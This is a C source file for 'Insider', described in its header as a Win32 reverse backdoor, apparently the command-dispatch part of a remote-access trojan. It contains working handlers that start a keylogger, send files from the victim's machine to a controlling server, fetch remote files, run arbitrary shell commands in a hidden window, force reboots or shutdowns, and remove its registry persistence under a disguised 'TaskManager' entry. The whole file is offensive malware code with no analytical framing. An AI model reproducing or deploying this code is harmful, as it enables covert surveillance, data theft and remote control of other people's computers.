

/* Insider -- Win32 reverse backdoor */


/*			
 * Built-in commands API
 * Each command must be in format
 *
 * char *cmd_name (char *arg)
 *
 * The command MUST return a string that is returned to server
 * or NULL if there's nothing to return. If string != NULL, the
 * global variable "used" must also be set.
 *
 * Example function:
 *
 * char *cmd_dummy (char *str) {
 * 	char *buf;
 *
 *	if (!(buf = strdup("The command return string")))
 * 		exit (1);
 *	used = strlen(buf);
 *	return buf;
 * }
 *
 * Remember also to add the command definition:
 *
 * char *cmd_dummy(char *);
 *
 * And entry in command struct:
 *
 * {"dummy "         ,cmd_dummy},
 *
 */



#include "insider.h"

/* Command function definitions */

char *cmd_cd(char *);
char *cmd_pwd(char *);
char *cmd_info(char *);
char *cmd_exit(char *);
char *cmd_timeout(char *);
char *cmd_logstart(char *);
char *cmd_logstop(char *);
char *cmd_download(char *);
char *cmd_fetch(char *);
char *cmd_system(char *);
char *cmd_reboot(char *);
char *cmd_shutdown(char *);
char *cmd_uninstall(char *);

/* 
 * Command structure
 *
 * Each command is presented in the structure as
 * (name, function) pair, for exameple:
 *
 * {"name ", cmd_name}
 *
 * add space char " " in the end of the name if you
 * expect command parameters.
 */

static struct {
        char *string;
        char *(*command)(char *);
} commands[] = {
	{"cd "         	,cmd_cd},
	{"download "    ,cmd_download},
	{"exit"      	,cmd_exit},
	{"fetch "    	,cmd_fetch},
        {"info"      	,cmd_info},
	{"logstart"     ,cmd_logstart},
        {"logstop"      ,cmd_logstop},
	{"pwd"          ,cmd_pwd},
	{"system "      ,cmd_system},
	{"timeout "     ,cmd_timeout},
	{"reboot"     	,cmd_reboot},
	{"shutdown"     ,cmd_shutdown},
	{"uninstall"    ,cmd_uninstall},
        {NULL		,NULL}
};


/* Command execution procedure */

char *
run_command(char *str) {
    	char *ret;
    	int     i;
	BOOL    done;

	ret = NULL;
    	if (strlen(str)) {
		done = FALSE;
        	for (i = 0 ;; i++){
            		if (commands[i].string == NULL)
				break;
            		if (!strncmp(commands[i].string, str,
					strlen(commands[i].string))) {
                		ret = commands[i].command(str + strlen(commands[i].string));
				done = TRUE;
                		break;
			}
            	}
        }
        if (done == FALSE)
        	ret = cmd_system(str);

	return ret;

}


/* Command fuctions */


/* 
 * cd - change current directory
 * parameters: directory name
 */

char *
cmd_cd (char *str) {
	char 	*dir;

	if (debug)
		fprintf(dt,"** Received cd %s\n", str);

	if (*str) {
		dir = cdir;
		cdir = getcd(str);
		free(dir);
	}
	return NULL;

}


/* pwd - print current directory */

char *
cmd_pwd (char *str) {
	char 	*buf;

	if (debug)
		fprintf(dt,"** Received pwd\n");

	if (!(buf = strdup(cdir)))
		exit (1);
	used = strlen(buf);
	return buf;
}


/* info - print client information */

char *
cmd_info (char *str) {
	char *buf;

	if (debug)
		fprintf(dt,"** Received info\n");
	if (!(buf = strdup(info)))
		exit (1);
	used = strlen(buf);
	return buf;

}

/*
 * logstart - start keylogger
 * parameters: logfile name
 */

char *
cmd_logstart (char *str) {
	char 	*buf, *dir;
	int 	c;

	if (debug)
		fprintf(dt,"** Starting keylog\n");

	/* Only for NT */
	if (!IsWinNT()) {
		return NULL;
	}

	/* Use supplied filename */
	dir = NULL;
	if (*str) {
		/* Skip whitespace: */
		str++;

		/* Find out filename */
		keylogfile = getcd(str);
	
	/* No file, use KEYLOG */
	} else {
		dir = KEYLOG;
		if (!(keylogfile = strdup(dir)))
			exit(1);
	}
	if (debug)
		fprintf(dt,"** Keylog file: %s\n", keylogfile);
				
	KeyCapThread = NULL;
	c = StartLog();
	if (c == 1) {
		if (!(buf = strdup("Cannot start keylogger\n")))
			exit (1);
	} else if (c == 2) {
		if (!(buf = strdup("Keylogger already running\n")))
			exit (1);
	} else {
		if (!(buf = strdup("Keylogger started succesfully\n")))
			exit (1);
	}
	used = strlen(buf);
	return buf;

}

/* logstop - stop keylogger */

char *
cmd_logstop (char *str) {
	char 	*buf;
	int 	c;
			
	if (debug)
		fprintf(dt,"** Stopping keylog\n");

	/* Only for NT */
	if (!IsWinNT()) {
		return NULL;
	}
	c = StopLog();
	if (c == 1) {
		if (!(buf = strdup("Cannot stop keylogger\n")))
			exit (1);
	} else if (c == 2) {
		if (!(buf = strdup("Keylogger already stopped\n")))
			exit (1);
	} else {
		if (!(buf = strdup("Keylogger stopped succesfully\n")))
			exit (1);
	}
	used = strlen(buf);
	free(keylogfile);
	return buf;
		
}

/* exit - exit client */

char *
cmd_exit (char *str) {
			
	if (debug)
		fprintf(dt,"** Received exit, shutting down\n");
	exit (0);
}

/*
 * timeout - set client polling timeout
 * parameters: min and max timeout in format [min]-[max]
 */

char *
cmd_timeout (char *str) {
	char 	*buf;
	int	c, d;
		
	if (debug)
		fprintf(dt,"** Received timeout %s\n", str);
	if ((sscanf(str, "%d-%d", &c, &d) == 2) &&
		(d > 0) && (c > 0) && (d > c)) {
	if (!(buf = strdup("Timeout set successfully\n")))
		exit (1);
	min = c;
	max = d;

	} else {
		if (!(buf = strdup("Usage: t min-max\n")))
			exit (1);
	}
	used = strlen(buf);
	return buf;
}

/*
 * download - download file from client machine
 * parameters: filename
 */

char *
cmd_download (char *str) {
	char 		*buf, *file;
	int 		c, d, len;
	FILE		*st;
	struct stat	sstat;
		
	if (debug)
		fprintf(dt,"** Received download %s\n", str);

	/* Open file handle */
	file = NULL;
	st = NULL;
	if (*str) {
		/* Find out filename */
		file = getcd(str);
	
	} else
		return NULL;

	if (debug) {
		fprintf(dt, "** Filename: %s\n", file);
		fflush(dt);
	}
	st = fopen(file, "rb");

	if (st == NULL) {
		if (debug)
			fprintf(dt,"** Cannot read file\n");
		if (!(buf = strdup("Cannot read file\n")))
			exit (1);
		used = strlen(buf);

	} else {
		/* Get file status */
		c = stat(file, &sstat);
		if (c == -1) {
			exit (1);
		}
		/*
		 * We need space for file + filename + 9 :
		 * "Upload;" + ";" + nul = 9 chars
		 */
		d = sstat.st_size + strlen(file) + 9;
		if (!(buf = (char *)malloc(d)))
			exit (1);
		memset(buf, 0, d); 

		/* Write file header */
		_snprintf(buf, strlen(file) + 8, "Upload;%s;", file);

		if (debug) {
			fprintf(dt, "** Size: %d, header: %d\n", d,
				strlen(file) + 8);
			fflush(dt);
		}

		/* Write file */
		c = fread(&buf[strlen(file) + 8], 1, sstat.st_size, st);
		if (c != sstat.st_size) {
			exit (1);
		}
		buf[d-1] = '\0';
		used = d;
		fclose(st);
	
		/* Binary files are _never_ encoded.. */
		encode = 0;

	}
	free(file);
	return buf;

}

/*
 * fetch - download file from the Internet over http protocol
 * parameters: url
 */

char *
cmd_fetch (char *str) {
	char 	*buf, *dir, *file, *r;
	char	*h_host, *h_url;
	char 	*http;
	int	c, d, len, h_port;
	FILE	*st;

	if (debug) {
		fprintf(dt,"** Fetching url: %s\n", str);
		fflush(dt);
	}

	/* Find local filename */
	st = NULL;
	dir = NULL;
	file = NULL;
	c = 0;
	r = &str[strlen(str)];
	for (;c <= strlen(str); c++, r--) {
		if (*r == '/' && *(r+1)) {
			file = r+1;
			break;
		}
	}
	/* Open file handle */
	if (file != NULL) {

		/* Find out filename */
		dir = getcd(file);

		st = fopen(dir, "wb");
	}
	
	if (st == NULL) {
		if (debug)
			fprintf(dt,"** cannot open local file\n");
		if (!(buf = strdup("Cannot open local file\n")))
			exit (1);			
	} else {

		/* Parse url */
		h_port = 80;
		if (!strncmp(str, "http://", 7)) {
			if (!(h_host = strdup(str+7)))
				exit (1);
		} else {
			if (!(h_host = strdup(str)))
				exit (1);
		}

		r = h_host;
		h_url = r;
		c = 0;
		while (*r != '\0') {
			if (*r == '/' && !c) {
				*r = '\0';
				if (*(r+1)) h_url = r + 1;
				c = 1;
			}
			if (*r == ':') {
				*r = '\0';
				if (*(r+1)) h_port = atoi(r+1);
			}
			r++;
		}

		/* Get file with GET */
		http = send_msg(h_url, NULL, h_host, h_port, HTTP_METHOD_GET);
		free(h_host);
				
		/* We got something, check for data payload */
		if ((http != NULL) && (http_status == 200)) {

			/* Write payload as local file */
			fwrite(http, sizeof(unsigned char), http_len, st);
			fclose(st);
			free(http);

			if (!(buf = strdup("File downloaded successfully\n")))
				exit (1);
			if (debug)
				fprintf(dt,"** File saved as %s\n", file);

		/* Something went wrong... */
		} else {		
			free(http);
			if (!(buf = strdup("HTTP server returned error\n")))
				exit (1);
		}
		fclose(st);
	}
	used = strlen(buf);
	free(dir);
	return buf;

}


/*
 * system - run command with system command interpreter (cmd.exe)
 * parameters: command
 */

char *
cmd_system (char *str) {
	char 			cmd[4096];
	char 			*buf;
	int			avail, bread;
	int			ExitStatus;
	HANDLE 			input, output;
	STARTUPINFO 		si;
  	SECURITY_DESCRIPTOR 	sd;
  	PROCESS_INFORMATION 	pi;
  		
	if (debug)
		fprintf(dt,"** Received system command %s\n", str);

	memset(cmd, 0, sizeof(cmd));
	if (IsWinNT())
		_snprintf(cmd, sizeof(cmd), 
			"cmd.exe /c %s\r\n", str);
	else
		_snprintf(cmd, sizeof(cmd), 
			"command.com /c %s\r\n", str);

	/* Create command pipe */
  	if (!CreatePipe(&output, &input, &sa, 0)) {
		return NULL;
  	}
				
	/* Set process parameters */
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
  	si.wShowWindow = SW_HIDE;
  	si.hStdOutput = input;
  	si.hStdError = input;

	/* Create process */
	if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 
		CREATE_NEW_CONSOLE, NULL, cdir, &si, &pi)) {

    		CloseHandle(input);
    		CloseHandle(output);
		return NULL;
 	}

	/* Read stdout */
	if (!(buf = (char *)malloc(1024)))
		exit (1);
	used = 0;
	bread = 1;
	ExitStatus = 0;
	while (1) {
		/* Break the loop when ready */
		GetExitCodeProcess(pi.hProcess,&ExitStatus);
    		if (ExitStatus != STILL_ACTIVE)
      			break;

		/* Clean allocated memory */
		memset(&buf[used], 0, 1024);

		/* Read the process output */
		PeekNamedPipe(output,
			&buf[used], 1023, &bread, &avail, NULL);

		/* We got something - copy output and allocate memory */
		if (bread != 0) {
			ReadFile(output, &buf[used], 1023, &bread, NULL);
			used += bread;
			if (!(buf = (char *)realloc(buf, used + 1024)))
				exit (1);
		}
	}
	/* Null-terminate and clean */
	buf[used] = '\0';
	CloseHandle(pi.hThread);
  	CloseHandle(pi.hProcess);
  	CloseHandle(input);
  	CloseHandle(output);

	return buf;
}


/* reboot - reboot the os */

char *
cmd_reboot(char *str) {
	char *buf;

	if (debug)
		fprintf(dt,"** Rebooting the operating system\n");

	buf = NULL;
	if (ExitWindowsEx(EWX_REBOOT|EWX_FORCE, 0) == FALSE){
            	if (!(buf = strdup("Cannot reboot\n")))
			exit (1);
		if (debug)
			fprintf(dt,"** Cannot reboot\n");
        }
	used = strlen(buf);
	return buf;

}

/* shutdown - shutdown the os */

char *
cmd_shutdown(char *str) {
	char *buf;

	if (debug)
		fprintf(dt,"** Shutting down the operating system\n");

	buf = NULL;
	if (ExitWindowsEx(EWX_SHUTDOWN|EWX_FORCE, 0) == FALSE){
            	if (!(buf = strdup("Cannot shutdown\n")))
			exit (1);
		if (debug)
			fprintf(dt,"** Cannot shutdown\n");
        }
	used = strlen(buf);
	return buf;

}

/* uninstall */

char *
cmd_uninstall(char *str) {
	char 	Data[1024], *Program, *buf;
	HKEY 	Result;
	LONG 	Return;
	DWORD 	Regtype, Size;


	/* Delete Run */
	
	Size = sizeof(Data);
	memset(Data, 0, Size);
	Return = RegOpenKeyEx(REGHIVE, TEXT(REGKEY), 0,
		KEY_ALL_ACCESS, &Result);
	if (Return == ERROR_SUCCESS) {
		Return = RegQueryValueEx(Result, TEXT(REGVAL),
			NULL, &Regtype, &Data[0], &Size);
		if (Return == ERROR_SUCCESS) {
			if (!(Program = strdup(Data)))
				exit(1);
		} else {
			if (!(buf = strdup("Cannot find registry value\n")))
				exit (1);
			used = strlen(buf);
			RegCloseKey(Result);
			return buf;
		}

		Return = RegDeleteValue(Result, TEXT(REGVAL));
		if (Return != ERROR_SUCCESS) {
			if (!(buf = strdup("Cannot delete registry value\n")))
				exit (1);
			used = strlen(buf);
			RegCloseKey(Result);
			free(Program);
			return buf;
		}

	} else {
		if (!(buf = strdup("Cannot open registry key\n")))
			exit (1);
		used = strlen(buf);
		RegCloseKey(Result);
		return buf;			
	}
	RegCloseKey(Result);


	/* Create RunOnce */

	Return = RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
		TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"), 0,
		KEY_WRITE, &Result);

	if (Return == ERROR_SUCCESS) {
		memset(Data, 0, Size);
		_snprintf(Data, Size, "del %s", Program);
		free(Program);
		Return = RegSetValueEx(Result, "TaskManager",
			0, REG_SZ, Data, strlen(Data));

		if (Return != ERROR_SUCCESS) {
			if (!(buf = strdup("Cannot set registry value\n")))
				exit (1);
		} else {
			if (!(buf = strdup("Uninstallation successful \n")))
				exit (1);
		}
		
	} else {

		if (!(buf = strdup("Cannot open registry key\n")))
			exit (1);
	
	}
	RegCloseKey(Result);
	used = strlen(buf);
	return buf;

}
